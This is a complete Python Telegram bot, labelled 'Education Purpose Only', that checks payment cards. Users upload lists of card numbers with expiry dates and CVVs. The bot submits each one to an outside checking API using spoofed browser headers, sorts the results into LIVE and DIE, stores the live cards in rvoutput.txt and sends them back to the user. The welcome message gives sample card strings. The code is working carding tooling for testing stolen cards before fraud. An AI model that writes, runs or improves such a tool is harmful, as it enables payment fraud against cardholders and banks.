#!/usr/bin/env python3
"""
CC Checker Telegram Bot v2.0 - Railway Compatible
Education Purpose Only
Author: RV

Reads BOT_TOKEN from environment variable ONLY.
No hardcoded token. No fallback.

Railway: Set BOT_TOKEN in Variables tab.
"""

import re
import os
import time
import json
import requests
import threading
from collections import Counter

# ============ TELEGRAM BOT SETUP ============
# Read from environment variable ONLY - Railway compatible
BOT_TOKEN = os.environ.get("BOT_TOKEN")

if not BOT_TOKEN:
    print("[ERROR] BOT_TOKEN environment variable is not set!")
    print("[INFO]  Please set BOT_TOKEN in your Railway Variables.")
    exit(1)

API_BASE = "https://api.telegram.org/bot" + BOT_TOKEN

# ============ CC CHECKER API CONFIG ============
CC_API_URL = "https://uncoder.eu.org/cc-checker/api.php"
CC_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Referer": "https://uncoder.eu.org/cc-checker/",
    "Origin": "https://uncoder.eu.org",
    "Accept": "application/json",
    "X-Requested-With": "XMLHttpRequest"
}

# ============ CARD NETWORK DETECTION ============
def get_card_network(card_number):
    card_str = str(card_number)
    if card_str.startswith('4'):
        return 'VISA'
    elif card_str[:2] in ['51','52','53','54','55'] or (222100 <= int(card_str[:6]) <= 272099):
        return 'MASTERCARD'
    elif card_str[:2] in ['34','37']:
        return 'AMEX'
    elif card_str[:4] == '6011' or card_str[:3] in ['644','645','646','647','648','649'] or (622126 <= int(card_str[:6]) <= 622925):
        return 'DISCOVER'
    elif card_str[:2] in ['62','81']:
        return 'UNIONPAY'
    elif card_str[:3] in ['300','301','302','303','304','305'] or card_str[:2] in ['36','38','39']:
        return 'DINERS'
    elif card_str[:2] in ['35']:
        return 'JCB'
    else:
        return 'UNKNOWN'

# ============ API CHECK ============
def check_card_api(card_num, mm, yy, cvv, retries=2):
    card_data = card_num + "|" + mm + "|" + yy + "|" + cvv
    data = {"data": card_data}

    for attempt in range(retries + 1):
        try:
            response = requests.post(CC_API_URL, data=data, headers=CC_HEADERS, timeout=15, allow_redirects=True)
            if response.status_code == 200:
                try:
                    return response.json()
                except:
                    return {"status": "error", "message": "Invalid JSON"}
            else:
                return {"status": "error", "message": "HTTP " + str(response.status_code)}
        except requests.exceptions.Timeout:
            if attempt < retries:
                time.sleep(2)
                continue
            return {"status": "error", "message": "Timeout"}
        except requests.exceptions.ConnectionError:
            if attempt < retries:
                time.sleep(2)
                continue
            return {"status": "error", "message": "Connection Error"}
        except Exception as e:
            return {"status": "error", "message": str(e)}
    return {"status": "error", "message": "Max retries"}

# ============ PARSE API RESULT ============
def parse_result(api_result, card_num, mm, yy, cvv):
    network = get_card_network(card_num)
    status = api_result.get("status", "unknown")
    message = api_result.get("message", "Unknown")

    if status == "live":
        return {"card": card_num, "mm": mm, "yy": yy, "cvv": cvv, "network": network, "status": "LIVE", "reason": message}
    elif status == "die":
        return {"card": card_num, "mm": mm, "yy": yy, "cvv": cvv, "network": network, "status": "DIE", "reason": message}
    else:
        return {"card": card_num, "mm": mm, "yy": yy, "cvv": cvv, "network": network, "status": "UNKNOWN", "reason": message}

# ============ RVOUPUT FUNCTIONS ============
def get_rvoutput_path():
    return os.path.join(os.getcwd(), "rvoutput.txt")

def append_to_rvoutput(cards):
    if not cards:
        return 0

    rvoutput_path = get_rvoutput_path()
    existing = set()

    if os.path.exists(rvoutput_path):
        try:
            with open(rvoutput_path, 'r') as f:
                for line in f:
                    existing.add(line.strip())
        except:
            pass

    new_count = 0
    with open(rvoutput_path, 'a') as f:
        for card in cards:
            card_line = card['card'] + "|" + card['mm'] + "|" + card['yy'] + "|" + card['cvv']
            if card_line not in existing:
                f.write(card_line + "\n")
                existing.add(card_line)
                new_count += 1

    return new_count

def get_rvoutput_count():
    rvoutput_path = get_rvoutput_path()
    if os.path.exists(rvoutput_path):
        with open(rvoutput_path, 'r') as f:
            return len([l for l in f if l.strip()])
    return 0

# ============ TELEGRAM API FUNCTIONS ============
def send_message(chat_id, text, parse_mode="HTML"):
    url = API_BASE + "/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode,
        "disable_web_page_preview": True
    }
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def send_document(chat_id, file_path, caption=""):
    url = API_BASE + "/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': chat_id, 'caption': caption}
            requests.post(url, files=files, data=data, timeout=30)
    except Exception as e:
        send_message(chat_id, "<b>Error sending file:</b>\n<code>" + str(e) + "</code>")

def edit_message(chat_id, message_id, text, parse_mode="HTML"):
    url = API_BASE + "/editMessageText"
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": parse_mode,
        "disable_web_page_preview": True
    }
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def send_status_message(chat_id, text):
    url = API_BASE + "/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML"
    }
    try:
        resp = requests.post(url, json=payload, timeout=10)
        return resp.json()["result"]["message_id"]
    except:
        return None

# ============ FORMAT RESULTS ============
def format_summary(live, die, unknown, total):
    return "<b>📊 CHECKING COMPLETE</b>\n\n" + \
           "<b>✅ LIVE:</b> <code>" + str(live) + "</code> cards\n" + \
           "<b>❌ DIE:</b> <code>" + str(die) + "</code> cards\n" + \
           "<b>⚠️ UNKNOWN:</b> <code>" + str(unknown) + "</code> cards\n\n" + \
           "<b>📁 Total Checked:</b> <code>" + str(total) + "</code>\n" + \
           "<b>💾 rvoutput.txt:</b> <code>" + str(get_rvoutput_count()) + "</code> total LIVE cards"

# ============ PROCESS FILE ============
def process_cards_file(file_path, chat_id, status_message_id):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip()]
    except Exception as e:
        edit_message(chat_id, status_message_id, "<b>❌ Error reading file:</b>\n<code>" + str(e) + "</code>")
        return

    total = len(lines)
    live_cards = []
    die_cards = []
    unknown_cards = []

    edit_message(chat_id, status_message_id, 
        "<b>🚀 Starting Check...</b>\n\n" +
        "<b>📁 Total Cards:</b> <code>" + str(total) + "</code>\n" +
        "<b>⏳ Progress:</b> <code>0/" + str(total) + "</code>\n" +
        "<b>✅ LIVE:</b> <code>0</code> | <b>❌ DIE:</b> <code>0</code>\n\n" +
        "<i>Checking in progress... Please wait ⏳</i>")

    for i, line in enumerate(lines, 1):
        match = re.match(r'(\d{16})\|(\d{2})\|(\d{2})\|(\d{3})', line)
        if not match:
            continue

        card_num, mm, yy, cvv = match.groups()

        api_result = check_card_api(card_num, mm, yy, cvv)
        result = parse_result(api_result, card_num, mm, yy, cvv)

        if result["status"] == "LIVE":
            live_cards.append(result)
        elif result["status"] == "DIE":
            die_cards.append(result)
        else:
            unknown_cards.append(result)

        if i % 5 == 0 or i == total:
            edit_message(chat_id, status_message_id,
                "<b>🚀 Checking Cards...</b>\n\n" +
                "<b>📁 Total:</b> <code>" + str(total) + "</code>\n" +
                "<b>⏳ Progress:</b> <code>" + str(i) + "/" + str(total) + "</code>\n" +
                "<b>✅ LIVE:</b> <code>" + str(len(live_cards)) + "</code> | <b>❌ DIE:</b> <code>" + str(len(die_cards)) + "</code>\n\n" +
                "<i>Please wait... ⏳</i>")

        if i < total:
            time.sleep(2)

    new_count = append_to_rvoutput(live_cards)

    summary = format_summary(len(live_cards), len(die_cards), len(unknown_cards), total)

    if new_count > 0:
        summary += "\n\n<b>📝 New LIVE cards added:</b> <code>" + str(new_count) + "</code>\n"
        summary += "<b>💾 Total in rvoutput.txt:</b> <code>" + str(get_rvoutput_count()) + "</code>"

    edit_message(chat_id, status_message_id, summary)

    # Send LIVE cards
    if live_cards:
        live_text = "<b>✅ LIVE CARDS:</b>\n\n"
        for card in live_cards:
            live_text += "<code>" + card['card'] + "|" + card['mm'] + "|" + card['yy'] + "|" + card['cvv'] + "</code>\n"

        if len(live_text) > 4000:
            chunks = []
            current = "<b>✅ LIVE CARDS:</b>\n\n"
            for card in live_cards:
                line = "<code>" + card['card'] + "|" + card['mm'] + "|" + card['yy'] + "|" + card['cvv'] + "</code>\n"
                if len(current) + len(line) > 4000:
                    chunks.append(current)
                    current = "<b>✅ LIVE CARDS (cont.):</b>\n\n" + line
                else:
                    current += line
            chunks.append(current)

            for chunk in chunks:
                send_message(chat_id, chunk)
        else:
            send_message(chat_id, live_text)

    # Send DIE cards
    if die_cards:
        die_text = "<b>❌ DIE CARDS:</b>\n\n"
        for card in die_cards[:50]:
            die_text += "<code>" + card['card'] + "|" + card['mm'] + "|" + card['yy'] + "|" + card['cvv'] + "</code>\n"

        if len(die_cards) > 50:
            die_text += "\n<i>... and " + str(len(die_cards) - 50) + " more</i>"

        send_message(chat_id, die_text)

    # Clean up
    try:
        os.remove(file_path)
    except:
        pass

# ============ HANDLE COMMANDS ============
def handle_start(chat_id):
    welcome = """<b>🃏 Welcome to CC Checker Bot!</b>

<i>Education Purpose Only</i>

<b>📋 Commands:</b>
<code>/check</code> - Upload cards file to check
<code>/rvoutput</code> - Get all LIVE cards (rvoutput.txt)
<code>/status</code> - Check bot status
<code>/help</code> - Show this help

<b>📁 File Format:</b>
<code>CARD|MM|YY|CVV</code>

<b>Example:</b>
<code>4246173334980266|07|29|702</code>
<code>5424320941998014|12|31|542</code>

<b>💾 LIVE cards auto-save to rvoutput.txt</b>

<i>By RV</i>"""
    send_message(chat_id, welcome)

def handle_help(chat_id):
    handle_start(chat_id)

def handle_status(chat_id):
    rv_count = get_rvoutput_count()
    status = "<b>🤖 Bot Status</b>\n\n" + \
             "<b>✅ Bot:</b> Online\n" + \
             "<b>💾 rvoutput.txt:</b> <code>" + str(rv_count) + "</code> LIVE cards\n" + \
             "<b>🔌 API:</b> uncoder.eu.org\n\n" + \
             "<i>Bot is ready to check cards!</i>"
    send_message(chat_id, status)

def handle_rvoutput(chat_id):
    rvoutput_path = get_rvoutput_path()

    if not os.path.exists(rvoutput_path):
        send_message(chat_id, "<b>❌ rvoutput.txt not found!</b>\n\n<i>No LIVE cards saved yet.</i>")
        return

    count = get_rvoutput_count()
    send_document(chat_id, rvoutput_path, "<b>📁 rvoutput.txt</b>\n<b>Total LIVE cards:</b> <code>" + str(count) + "</code>")

def handle_check(chat_id):
    send_message(chat_id, 
        "<b>📤 Send Cards File</b>\n\n" +
        "Please upload a <code>.txt</code> file with cards in format:\n" +
        "<code>CARD|MM|YY|CVV</code>\n\n" +
        "<i>One card per line</i>")

def handle_document(chat_id, file_id, file_name):
    if not file_name.endswith('.txt'):
        send_message(chat_id, "<b>❌ Invalid file!</b>\n\nPlease send a <code>.txt</code> file.")
        return

    file_info_url = API_BASE + "/getFile"
    try:
        resp = requests.post(file_info_url, json={"file_id": file_id}, timeout=10)
        file_path = resp.json()["result"]["file_path"]
    except:
        send_message(chat_id, "<b>❌ Error downloading file!</b>")
        return

    download_url = "https://api.telegram.org/file/bot" + BOT_TOKEN + "/" + file_path
    try:
        file_resp = requests.get(download_url, timeout=30)
        temp_path = "/tmp/" + file_name
        with open(temp_path, 'wb') as f:
            f.write(file_resp.content)
    except:
        send_message(chat_id, "<b>❌ Error saving file!</b>")
        return

    status_msg = send_status_message(chat_id, "<b>🚀 Processing file...</b>\n\n<i>Please wait ⏳</i>")

    thread = threading.Thread(target=process_cards_file, args=(temp_path, chat_id, status_msg))
    thread.start()

# ============ POLLING ============
def get_updates(offset=None):
    url = API_BASE + "/getUpdates"
    params = {"timeout": 30, "limit": 100}
    if offset:
        params["offset"] = offset

    try:
        resp = requests.get(url, params=params, timeout=35)
        return resp.json().get("result", [])
    except:
        return []

def process_update(update):
    if "message" not in update:
        return

    message = update["message"]
    chat_id = message["chat"]["id"]

    if "text" in message:
        text = message["text"]

        if text == "/start":
            handle_start(chat_id)
        elif text == "/help":
            handle_help(chat_id)
        elif text == "/status":
            handle_status(chat_id)
        elif text == "/rvoutput":
            handle_rvoutput(chat_id)
        elif text == "/check":
            handle_check(chat_id)
        else:
            send_message(chat_id, "<b>❓ Unknown command!</b>\n\nUse <code>/help</code> for available commands.")

    elif "document" in message:
        doc = message["document"]
        file_id = doc["file_id"]
        file_name = doc.get("file_name", "unknown.txt")
        handle_document(chat_id, file_id, file_name)

# ============ MAIN ============
def main():
    print("=" * 55)
    print("  CC CHECKER TELEGRAM BOT v2.0")
    print("  Railway Compatible")
    print("=" * 55)
    print("")
    print("  Bot Token: " + BOT_TOKEN[:15] + "...")
    print("  API: " + CC_API_URL)
    print("  rvoutput.txt: " + get_rvoutput_path())
    print("")
    print("  Starting polling...")
    print("  Press Ctrl+C to stop")
    print("")

    offset = None

    while True:
        try:
            updates = get_updates(offset)

            for update in updates:
                update_id = update["update_id"]
                offset = update_id + 1

                thread = threading.Thread(target=process_update, args=(update,))
                thread.start()

            time.sleep(1)

        except KeyboardInterrupt:
            print("\n  Bot stopped!")
            break
        except Exception as e:
            print("  Error: " + str(e))
            time.sleep(5)

if __name__ == "__main__":
    main()
